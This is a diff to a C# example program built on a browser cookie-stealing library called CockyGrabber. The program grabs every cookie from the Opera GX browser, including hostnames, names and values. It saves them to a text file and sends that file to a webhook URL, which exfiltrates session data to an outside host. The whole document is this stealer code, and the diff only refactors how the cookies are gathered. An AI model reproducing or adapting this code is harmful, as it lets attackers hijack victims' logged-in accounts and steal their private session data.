@@ -1,6 +1,5 @@
 using CockyGrabber;
 using CockyGrabber.Grabbers;
-using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text;
@@ -36,14 +35,14 @@ namespace CockyGrabberTest
         static void Main(string[] args)
         {
             OperaGxGrabber g = new OperaGxGrabber(); // Create Grabber
-            List<string> cookies = new List<string>();
+            StringBuilder cookies = new StringBuilder();
 
             g.GetCookies().ToList().ForEach(delegate (Blink.Cookie c) // For every grabbed cookie:
             {
-                cookies.Add($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.DecryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
+                cookies.AppendLine($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
             });
 
-            File.WriteAllLines("./cookies_save.txt", cookies); // Save cookies in cookies_save.txt
+            File.WriteAllText("./cookies_save.txt", cookies.ToString()); // Save cookies in cookies_save.txt
             SendFile(WebhookUrl, "./cookies_save.txt"); // Send the File to the Webhook
         }
     }
